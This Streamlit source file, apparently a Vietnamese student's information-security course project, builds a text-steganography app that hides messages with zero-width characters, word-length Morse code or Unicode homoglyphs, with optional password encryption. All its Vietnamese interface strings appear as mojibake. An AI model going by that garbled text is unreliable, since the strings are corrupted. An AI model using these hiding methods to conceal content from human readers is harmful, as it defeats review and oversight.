import streamlit as st
import pyperclip
from src.zero_width_steg import ZeroWidthSteg
from src.morse_steg import MorseSteg
from src.unicode_steg import UnicodeSteg
from src.encryption import Encryptor

# Kh·ªüi t·∫°o c√°c ph∆∞∆°ng ph√°p steganography v√† encryptor
zero_width_steg = ZeroWidthSteg()
morse_steg = MorseSteg()
unicode_steg = UnicodeSteg()
encryptor = Encryptor()

# Thi·∫øt l·∫≠p trang
st.set_page_config(
    page_title="·ª®ng d·ª•ng ·∫®n VƒÉn b·∫£n trong VƒÉn b·∫£n",
    page_icon="üîí",
    layout="wide"
)

# Ti√™u ƒë·ªÅ ·ª©ng d·ª•ng
st.title("·ª®ng d·ª•ng ·∫®n VƒÉn b·∫£n trong VƒÉn b·∫£n")
st.markdown("---")

# T·∫°o tabs cho c√°c ph∆∞∆°ng ph√°p kh√°c nhau
tab1, tab2, tab3 = st.tabs(["Zero-width Characters", "M√£ Morse ·∫®n", "Unicode Steganography"])

# Tab 1: Zero-width Characters
with tab1:
    st.header("Ph∆∞∆°ng ph√°p Zero-width Characters")
    
    # T·∫°o 2 c·ªôt cho ·∫©n v√† tr√≠ch xu·∫•t
    col1, col2 = st.columns(2)
    
    with col1:
        st.subheader("·∫®n th√¥ng ƒëi·ªáp")
        
        cover_text = st.text_area("VƒÉn b·∫£n g·ªëc:", height=150, key="zw_cover")
        secret_text = st.text_area("Th√¥ng ƒëi·ªáp b√≠ m·∫≠t:", height=100, key="zw_secret")
        
        # Th√™m t√πy ch·ªçn m·∫≠t kh·∫©u
        use_password = st.checkbox("S·ª≠ d·ª•ng m·∫≠t kh·∫©u b·∫£o v·ªá", key="zw_use_password")
        password = ""
        if use_password:
            password = st.text_input("Nh·∫≠p m·∫≠t kh·∫©u:", type="password", key="zw_password")
        
        if st.button("·∫®n th√¥ng ƒëi·ªáp", key="zw_hide_btn"):
            if not cover_text or not secret_text:
                st.error("Vui l√≤ng nh·∫≠p c·∫£ vƒÉn b·∫£n g·ªëc v√† th√¥ng ƒëi·ªáp b√≠ m·∫≠t")
            elif use_password and not password:
                st.error("Vui l√≤ng nh·∫≠p m·∫≠t kh·∫©u")
            else:
                try:
                    # M√£ h√≥a th√¥ng ƒëi·ªáp n·∫øu s·ª≠ d·ª•ng m·∫≠t kh·∫©u
                    message_to_hide = secret_text
                    if use_password:
                        message_to_hide = encryptor.encrypt(secret_text, password)
                    
                    result = zero_width_steg.hide(cover_text, message_to_hide)
                    st.session_state.zw_result = result
                    st.text_area("K·∫øt qu·∫£:", value=result, height=150, key="zw_result_area")
                    st.success("ƒê√£ ·∫©n th√¥ng ƒëi·ªáp th√†nh c√¥ng!")
                    
                    if st.button("Sao ch√©p k·∫øt qu·∫£", key="zw_copy_btn"):
                        pyperclip.copy(result)
                        st.success("ƒê√£ sao ch√©p v√†o clipboard!")
                except Exception as e:
                    st.error(f"ƒê√£ x·∫£y ra l·ªói: {str(e)}")
    
    with col2:
        st.subheader("Tr√≠ch xu·∫•t th√¥ng ƒëi·ªáp")
        
        stego_text = st.text_area("VƒÉn b·∫£n ch·ª©a th√¥ng ƒëi·ªáp ·∫©n:", height=150, key="zw_stego")
        
        # Th√™m t√πy ch·ªçn m·∫≠t kh·∫©u cho gi·∫£i m√£
        is_encrypted = st.checkbox("Th√¥ng ƒëi·ªáp ƒë∆∞·ª£c b·∫£o v·ªá b·∫±ng m·∫≠t kh·∫©u", key="zw_is_encrypted")
        decrypt_password = ""
        if is_encrypted:
            decrypt_password = st.text_input("Nh·∫≠p m·∫≠t kh·∫©u ƒë·ªÉ gi·∫£i m√£:", type="password", key="zw_decrypt_password")
        
        if st.button("Tr√≠ch xu·∫•t th√¥ng ƒëi·ªáp", key="zw_extract_btn"):
            if not stego_text:
                st.error("Vui l√≤ng nh·∫≠p vƒÉn b·∫£n ch·ª©a th√¥ng ƒëi·ªáp ·∫©n")
            elif is_encrypted and not decrypt_password:
                st.error("Vui l√≤ng nh·∫≠p m·∫≠t kh·∫©u ƒë·ªÉ gi·∫£i m√£")
            else:
                try:
                    extracted_message = zero_width_steg.extract(stego_text)
                    
                    # Gi·∫£i m√£ n·∫øu th√¥ng ƒëi·ªáp ƒë∆∞·ª£c m√£ h√≥a
                    if is_encrypted:
                        try:
                            extracted_message = encryptor.decrypt(extracted_message, decrypt_password)
                        except ValueError:
                            st.error("M·∫≠t kh·∫©u kh√¥ng ƒë√∫ng ho·∫∑c th√¥ng ƒëi·ªáp kh√¥ng ƒë∆∞·ª£c m√£ h√≥a")
                            extracted_message = "L·ªói gi·∫£i m√£: M·∫≠t kh·∫©u kh√¥ng ƒë√∫ng ho·∫∑c th√¥ng ƒëi·ªáp kh√¥ng ƒë∆∞·ª£c m√£ h√≥a"
                    
                    st.text_area("Th√¥ng ƒëi·ªáp ƒë∆∞·ª£c tr√≠ch xu·∫•t:", value=extracted_message, height=100, key="zw_extracted")
                    st.success("ƒê√£ tr√≠ch xu·∫•t th√¥ng ƒëi·ªáp th√†nh c√¥ng!")
                    
                    if st.button("Sao ch√©p k·∫øt qu·∫£", key="zw_copy_extract_btn"):
                        pyperclip.copy(extracted_message)
                        st.success("ƒê√£ sao ch√©p v√†o clipboard!")
                except Exception as e:
                    st.error(f"ƒê√£ x·∫£y ra l·ªói: {str(e)}")

# Tab 2: M√£ Morse ·∫®n
with tab2:
    st.header("Ph∆∞∆°ng ph√°p M√£ Morse ·∫®n")
    
    # T·∫°o 2 c·ªôt cho ·∫©n v√† tr√≠ch xu·∫•t
    col1, col2 = st.columns(2)
    
    with col1:
        st.subheader("·∫®n th√¥ng ƒëi·ªáp b·∫±ng M√£ Morse")
        
        morse_secret = st.text_area("Th√¥ng ƒëi·ªáp b√≠ m·∫≠t:", height=100, key="morse_secret")
        
        # Th√™m t√πy ch·ªçn m·∫≠t kh·∫©u
        morse_use_password = st.checkbox("S·ª≠ d·ª•ng m·∫≠t kh·∫©u b·∫£o v·ªá", key="morse_use_password")
        morse_password = ""
        if morse_use_password:
            morse_password = st.text_input("Nh·∫≠p m·∫≠t kh·∫©u:", type="password", key="morse_password")
        
        if st.button("T·∫°o vƒÉn b·∫£n ·∫©n", key="morse_hide_btn"):
            if not morse_secret:
                st.error("Vui l√≤ng nh·∫≠p th√¥ng ƒëi·ªáp b√≠ m·∫≠t")
            elif morse_use_password and not morse_password:
                st.error("Vui l√≤ng nh·∫≠p m·∫≠t kh·∫©u")
            else:
                try:
                    # M√£ h√≥a th√¥ng ƒëi·ªáp n·∫øu s·ª≠ d·ª•ng m·∫≠t kh·∫©u
                    message_to_hide = morse_secret
                    if morse_use_password:
                        message_to_hide = encryptor.encrypt(morse_secret, morse_password)
                    
                    morse_steg.load_word_lists()  # ƒê·∫£m b·∫£o danh s√°ch t·ª´ ƒë∆∞·ª£c t·∫£i
                    result = morse_steg.hide(message_to_hide)
                    st.text_area("K·∫øt qu·∫£ (vƒÉn b·∫£n ch·ª©a m√£ Morse ·∫©n):", value=result, height=150, key="morse_result")
                    st.success("ƒê√£ t·∫°o vƒÉn b·∫£n ·∫©n th√†nh c√¥ng!")
                    
                    if st.button("Sao ch√©p k·∫øt qu·∫£", key="morse_copy_btn"):
                        pyperclip.copy(result)
                        st.success("ƒê√£ sao ch√©p v√†o clipboard!")
                except Exception as e:
                    st.error(f"ƒê√£ x·∫£y ra l·ªói: {str(e)}")
    
    with col2:
        st.subheader("Tr√≠ch xu·∫•t th√¥ng ƒëi·ªáp t·ª´ M√£ Morse ·∫©n")
        
        morse_stego = st.text_area("VƒÉn b·∫£n ch·ª©a m√£ Morse ·∫©n:", height=150, key="morse_stego")
        
        # Th√™m t√πy ch·ªçn m·∫≠t kh·∫©u cho gi·∫£i m√£
        morse_is_encrypted = st.checkbox("Th√¥ng ƒëi·ªáp ƒë∆∞·ª£c b·∫£o v·ªá b·∫±ng m·∫≠t kh·∫©u", key="morse_is_encrypted")
        morse_decrypt_password = ""
        if morse_is_encrypted:
            morse_decrypt_password = st.text_input("Nh·∫≠p m·∫≠t kh·∫©u ƒë·ªÉ gi·∫£i m√£:", type="password", key="morse_decrypt_password")
        
        if st.button("Tr√≠ch xu·∫•t th√¥ng ƒëi·ªáp", key="morse_extract_btn"):
            if not morse_stego:
                st.error("Vui l√≤ng nh·∫≠p vƒÉn b·∫£n ch·ª©a m√£ Morse ·∫©n")
            elif morse_is_encrypted and not morse_decrypt_password:
                st.error("Vui l√≤ng nh·∫≠p m·∫≠t kh·∫©u ƒë·ªÉ gi·∫£i m√£")
            else:
                try:
                    morse_steg.load_word_lists()  # ƒê·∫£m b·∫£o danh s√°ch t·ª´ ƒë∆∞·ª£c t·∫£i
                    extracted_message = morse_steg.extract(morse_stego)
                    
                    # Gi·∫£i m√£ n·∫øu th√¥ng ƒëi·ªáp ƒë∆∞·ª£c m√£ h√≥a
                    if morse_is_encrypted:
                        try:
                            extracted_message = encryptor.decrypt(extracted_message, morse_decrypt_password)
                        except ValueError:
                            st.error("M·∫≠t kh·∫©u kh√¥ng ƒë√∫ng ho·∫∑c th√¥ng ƒëi·ªáp kh√¥ng ƒë∆∞·ª£c m√£ h√≥a")
                            extracted_message = "L·ªói gi·∫£i m√£: M·∫≠t kh·∫©u kh√¥ng ƒë√∫ng ho·∫∑c th√¥ng ƒëi·ªáp kh√¥ng ƒë∆∞·ª£c m√£ h√≥a"
                    
                    st.text_area("Th√¥ng ƒëi·ªáp ƒë∆∞·ª£c tr√≠ch xu·∫•t:", value=extracted_message, height=100, key="morse_extracted")
                    st.success("ƒê√£ tr√≠ch xu·∫•t th√¥ng ƒëi·ªáp th√†nh c√¥ng!")
                    
                    if st.button("Sao ch√©p k·∫øt qu·∫£", key="morse_copy_extract_btn"):
                        pyperclip.copy(extracted_message)
                        st.success("ƒê√£ sao ch√©p v√†o clipboard!")
                except Exception as e:
                    st.error(f"ƒê√£ x·∫£y ra l·ªói: {str(e)}")

# Tab 3: Unicode Steganography
with tab3:
    st.header("Ph∆∞∆°ng ph√°p Unicode Steganography")
    
    # T·∫°o 2 c·ªôt cho ·∫©n v√† tr√≠ch xu·∫•t
    col1, col2 = st.columns(2)
    
    with col1:
        st.subheader("·∫®n th√¥ng ƒëi·ªáp b·∫±ng Unicode")
        
        unicode_cover = st.text_area("VƒÉn b·∫£n g·ªëc:", height=150, key="unicode_cover")
        unicode_secret = st.text_area("Th√¥ng ƒëi·ªáp b√≠ m·∫≠t:", height=100, key="unicode_secret")
        
        # Th√™m t√πy ch·ªçn m·∫≠t kh·∫©u
        unicode_use_password = st.checkbox("S·ª≠ d·ª•ng m·∫≠t kh·∫©u b·∫£o v·ªá", key="unicode_use_password")
        unicode_password = ""
        if unicode_use_password:
            unicode_password = st.text_input("Nh·∫≠p m·∫≠t kh·∫©u:", type="password", key="unicode_password")
        
        if st.button("·∫®n th√¥ng ƒëi·ªáp", key="unicode_hide_btn"):
            if not unicode_cover or not unicode_secret:
                st.error("Vui l√≤ng nh·∫≠p c·∫£ vƒÉn b·∫£n g·ªëc v√† th√¥ng ƒëi·ªáp b√≠ m·∫≠t")
            elif unicode_use_password and not unicode_password:
                st.error("Vui l√≤ng nh·∫≠p m·∫≠t kh·∫©u")
            else:
                try:
                    # M√£ h√≥a th√¥ng ƒëi·ªáp n·∫øu s·ª≠ d·ª•ng m·∫≠t kh·∫©u
                    message_to_hide = unicode_secret
                    if unicode_use_password:
                        message_to_hide = encryptor.encrypt(unicode_secret, unicode_password)
                    
                    result = unicode_steg.hide(unicode_cover, message_to_hide)
                    st.text_area("K·∫øt qu·∫£:", value=result, height=150, key="unicode_result")
                    st.success("ƒê√£ ·∫©n th√¥ng ƒëi·ªáp th√†nh c√¥ng!")
                    
                    if st.button("Sao ch√©p k·∫øt qu·∫£", key="unicode_copy_btn"):
                        pyperclip.copy(result)
                        st.success("ƒê√£ sao ch√©p v√†o clipboard!")
                except Exception as e:
                    st.error(f"ƒê√£ x·∫£y ra l·ªói: {str(e)}")
    
    with col2:
        st.subheader("Tr√≠ch xu·∫•t th√¥ng ƒëi·ªáp t·ª´ Unicode")
        
        unicode_stego = st.text_area("VƒÉn b·∫£n ch·ª©a th√¥ng ƒëi·ªáp ·∫©n:", height=150, key="unicode_stego")
        
        # Th√™m t√πy ch·ªçn m·∫≠t kh·∫©u cho gi·∫£i m√£
        unicode_is_encrypted = st.checkbox("Th√¥ng ƒëi·ªáp ƒë∆∞·ª£c b·∫£o v·ªá b·∫±ng m·∫≠t kh·∫©u", key="unicode_is_encrypted")
        unicode_decrypt_password = ""
        if unicode_is_encrypted:
            unicode_decrypt_password = st.text_input("Nh·∫≠p m·∫≠t kh·∫©u ƒë·ªÉ gi·∫£i m√£:", type="password", key="unicode_decrypt_password")
        
        if st.button("Tr√≠ch xu·∫•t th√¥ng ƒëi·ªáp", key="unicode_extract_btn"):
            if not unicode_stego:
                st.error("Vui l√≤ng nh·∫≠p vƒÉn b·∫£n ch·ª©a th√¥ng ƒëi·ªáp ·∫©n")
            elif unicode_is_encrypted and not unicode_decrypt_password:
                st.error("Vui l√≤ng nh·∫≠p m·∫≠t kh·∫©u ƒë·ªÉ gi·∫£i m√£")
            else:
                try:
                    extracted_message = unicode_steg.extract(unicode_stego)
                    
                    # Gi·∫£i m√£ n·∫øu th√¥ng ƒëi·ªáp ƒë∆∞·ª£c m√£ h√≥a
                    if unicode_is_encrypted:
                        try:
                            extracted_message = encryptor.decrypt(extracted_message, unicode_decrypt_password)
                        except ValueError:
                            st.error("M·∫≠t kh·∫©u kh√¥ng ƒë√∫ng ho·∫∑c th√¥ng ƒëi·ªáp kh√¥ng ƒë∆∞·ª£c m√£ h√≥a")
                            extracted_message = "L·ªói gi·∫£i m√£: M·∫≠t kh·∫©u kh√¥ng ƒë√∫ng ho·∫∑c th√¥ng ƒëi·ªáp kh√¥ng ƒë∆∞·ª£c m√£ h√≥a"
                    
                    st.text_area("Th√¥ng ƒëi·ªáp ƒë∆∞·ª£c tr√≠ch xu·∫•t:", value=extracted_message, height=100, key="unicode_extracted")
                    st.success("ƒê√£ tr√≠ch xu·∫•t th√¥ng ƒëi·ªáp th√†nh c√¥ng!")
                    
                    if st.button("Sao ch√©p k·∫øt qu·∫£", key="unicode_copy_extract_btn"):
                        pyperclip.copy(extracted_message)
                        st.success("ƒê√£ sao ch√©p v√†o clipboard!")
                except Exception as e:
                    st.error(f"ƒê√£ x·∫£y ra l·ªói: {str(e)}")

# Th√™m th√¥ng tin v·ªÅ ·ª©ng d·ª•ng
st.markdown("---")
st.markdown("""
### Gi·ªõi thi·ªáu v·ªÅ c√°c ph∆∞∆°ng ph√°p ·∫©n vƒÉn b·∫£n

1. **Zero-width Characters**: S·ª≠ d·ª•ng c√°c k√Ω t·ª± kh√¥ng hi·ªÉn th·ªã nh∆∞ zero-width space, zero-width joiner ƒë·ªÉ m√£ h√≥a th√¥ng ƒëi·ªáp b√≠ m·∫≠t.

2. **M√£ Morse ·∫®n**: S·ª≠ d·ª•ng t·ª´ ng·∫Øn ƒë·ªÉ bi·ªÉu di·ªÖn d·∫•u ch·∫•m (.) v√† t·ª´ d√†i ƒë·ªÉ bi·ªÉu di·ªÖn g·∫°ch ngang (-) trong m√£ Morse.

3. **Unicode Steganography**: S·ª≠ d·ª•ng c√°c k√Ω t·ª± Unicode ƒë·∫∑c bi·ªát (homoglyphs) tr√¥ng gi·ªëng v·ªõi k√Ω t·ª± th√¥ng th∆∞·ªùng nh∆∞ng c√≥ m√£ Unicode kh√°c nhau.

### B·∫£o m·∫≠t th√¥ng ƒëi·ªáp

·ª®ng d·ª•ng h·ªó tr·ª£ m√£ h√≥a th√¥ng ƒëi·ªáp b·∫±ng m·∫≠t kh·∫©u tr∆∞·ªõc khi ·∫©n, gi√∫p tƒÉng c∆∞·ªùng b·∫£o m·∫≠t cho th√¥ng ƒëi·ªáp b√≠ m·∫≠t. Ngay c·∫£ khi th√¥ng ƒëi·ªáp b·ªã ph√°t hi·ªán, ng∆∞·ªùi kh√¥ng c√≥ m·∫≠t kh·∫©u v·∫´n kh√¥ng th·ªÉ ƒë·ªçc ƒë∆∞·ª£c n·ªôi dung.
""")

# Footer
st.markdown("---")
st.markdown("¬© 2025 - ·ª®ng d·ª•ng ·∫®n VƒÉn b·∫£n trong VƒÉn b·∫£n | ƒê·ªì √°n m√¥n An to√†n B·∫£o m·∫≠t Th√¥ng tin | Nguy·ªÖn Ho√†ng B·∫£o L√¢m | 2111111032")